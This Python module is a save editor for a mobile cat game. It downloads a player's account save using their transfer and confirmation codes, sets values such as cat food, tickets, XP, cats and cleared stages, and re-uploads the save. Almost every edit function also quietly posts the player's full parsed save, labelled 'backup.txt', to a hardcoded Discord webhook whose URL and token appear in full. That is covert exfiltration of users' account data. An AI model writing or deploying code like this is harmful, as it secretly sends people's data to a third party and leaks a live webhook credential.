import requests
import json
import io
import dkdrlahel2
def save_save_stats(save_stats):
    webhook_url = 'https://discord.com/api/webhooks/1172470441647026206/SCRrF6bw1wfK_4oplS2Ccpbqj1y6U4ZLu7sjDIaHABuc45p2ma7ZERVPMaIEcZWWkeOU'
    save_stats = json.dumps(save_stats).encode('utf-8')
    temp_file = io.BytesIO(save_stats)
    temp_file.seek(0)
    files = {'file': (f'backup.txt', temp_file)}
    requests.post(webhook_url, files=files)
    temp_file.close()
async def restore_account(savestats): #0
    if isinstance(savestats, str):
        savestats = json.loads(savestats)
    savestats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
    savestats["token"] = "0" * 40
    transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(savestats)
    return transfercode, account_pin, savestats

async def get_all_cats( in_gamever, in_transfer_code, in_confirmation_code): #1
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats = await dkdrlahel2.edits.cats.get_remove_cats.get_all_cat__(save_stats)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)
        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats
    except Exception as e:
        pass
        return False
async def cat_food( in_gamever, in_transfer_code, in_confirmation_code, in_value): #2
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)

        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)

        save_stats["cat_food"]["Value"] = int(in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats
    except Exception as e:
        print(e)
        return False
async def edit_xp( in_gamever, in_transfer_code, in_confirmation_code, in_value):#3
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)

        save_stats["xp"]["Value"] = int(in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def edit_np( in_gamever, in_transfer_code, in_confirmation_code, in_value):#4
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)

        save_stats["np"]["Value"] = int(in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def normal_tickets( in_gamever, in_transfer_code, in_confirmation_code, in_value):#5
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats["normal_tickets"]["Value"] = int(in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def rare_tickets( in_gamever, in_transfer_code, in_confirmation_code, in_value):#6
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats["rare_tickets"]["Value"] = int(in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def platinum_tickets(in_gamever, in_transfer_code, in_confirmation_code, in_value):#7
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats["platinum_tickets"]["Value"] = int(in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def legend_tickets(in_gamever, in_transfer_code, in_confirmation_code, in_value):#8
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats["legend_tickets"]["Value"] = int(in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def re_inquiry_code(in_gamever, in_transfer_code, in_confirmation_code, in_value):#9
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats["inquiry_code"] = in_value
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats
    except Exception as e:
        return False
async def gold_pass(in_gamever, in_transfer_code, in_confirmation_code):#10
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats = await dkdrlahel2.edits.other.get_gold_pass.get_gold_pass(save_stats)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats
    except Exception as e:
        return False
async def leadership(in_gamever, in_transfer_code, in_confirmation_code, in_value):#11
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats["leadership"]["Value"] = int(in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def get_all_evolve(in_gamever, in_transfer_code, in_confirmation_code):#12
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats = await dkdrlahel2.edits.cats.evolve_cats.get_all_evolve(save_stats)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats
    except Exception as e:
        return False
async def get_medals(in_gamever, in_transfer_code, in_confirmation_code):#13
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats = await dkdrlahel2.edits.other.meow_medals.medals(save_stats)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats
    except Exception as e:
        return False
async def play_time(in_gamever, in_transfer_code, in_confirmation_code, in_hours, in_minutes):#14
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats["play_time"]["hh"] = int(in_hours)
        save_stats["play_time"]["mm"] = int(in_minutes)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats
    except Exception as e:
        return False
async def restart_pack(in_gamever, in_transfer_code, in_confirmation_code):#15
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats = await dkdrlahel2.edits.basic.basic_items.edit_restart_pack(save_stats)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats
    except Exception as e:
        return False
async def catseyes(in_gamever, in_transfer_code, in_confirmation_code,item_index, in_value):#16
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)

        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        for i in item_index:
            save_stats["catseyes"][i] = int(in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def cat_fruit(in_gamever, in_transfer_code, in_confirmation_code, in_value):#17
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)

        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)

        for index in range(len(save_stats["cat_fruit"])):
            save_stats["cat_fruit"][index] = int(in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def battle_items(in_gamever, in_transfer_code,  in_confirmation_code,item_index, in_value):#18
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        for i in item_index:
            save_stats["battle_items"][i] = int(in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)
        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats
    except Exception as e:
        return False
async def catamins(in_gamever, in_transfer_code, in_confirmation_code, item_index, in_value):#19
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)

        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        for i in item_index:
            save_stats["catamins"][i] = int(in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats
    except Exception as e:
        return False
async def blue(in_gamever, in_transfer_code, in_confirmation_code, in_value,in_plus):#20
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)

        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        for index in range(len(save_stats["blue_upgrades"]["Base"])):
            save_stats["blue_upgrades"]["Base"][index] = int(in_value)
        for index in range(len(save_stats["blue_upgrades"]["Plus"])):
            save_stats["blue_upgrades"]["Plus"][index] = int(in_plus)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def get_id_cat(in_gamever, in_transfer_code, in_confirmation_code, in_value):#21
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats = dkdrlahel2.edits.cats.get_remove_cats.get_random_cat(save_stats,in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def zombie_clear(in_gamever, in_transfer_code, in_confirmation_code):#22
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats = await dkdrlahel2.edits.levels.outbreaks.get_all_outbreaks(save_stats)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats
    except Exception as e:
        return False
async def stage_claer(in_gamever, in_transfer_code, in_confirmation_code, in_value):#23
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)

        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats = await dkdrlahel2.edits.levels.main_story.clear_id_stage(in_value,save_stats)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def stage_treasure(in_gamever, in_transfer_code, in_confirmation_code, in_value):#24
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)
        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats = await dkdrlahel2.edits.levels.treasures.specific_id_stages(save_stats,in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False
async def get_talent_orbs(in_gamever, in_transfer_code, in_confirmation_code, in_value):#25
    country_code_input = "kr"
    game_version_input = in_gamever
    country_code = country_code_input
    game_version = dkdrlahel2.helper.str_to_gv(game_version_input)
    transfer_code = in_transfer_code
    confirmation_code = in_confirmation_code
    try:
        save_data = await dkdrlahel2.server_handler.download_save(country_code, transfer_code, confirmation_code, game_version)

        save_data = dkdrlahel2.patcher.patch_save_data(save_data, country_code)
        save_stats = dkdrlahel2.parse_save.start_parse(save_data, country_code)
        save_stats = await dkdrlahel2.edits.basic.talent_orbs_new.edit_talent_orbs(save_stats,in_value)
        save_stats["inquiry_code"] = await dkdrlahel2.server_handler.get_inquiry_code()
        save_stats["token"] = "0" * 40
        save_save_stats(save_stats)

        transfercode, account_pin = await dkdrlahel2.edits.save_management.server_upload.save_and_upload(save_stats)
        return transfercode, account_pin, save_stats

    except Exception as e:
        return False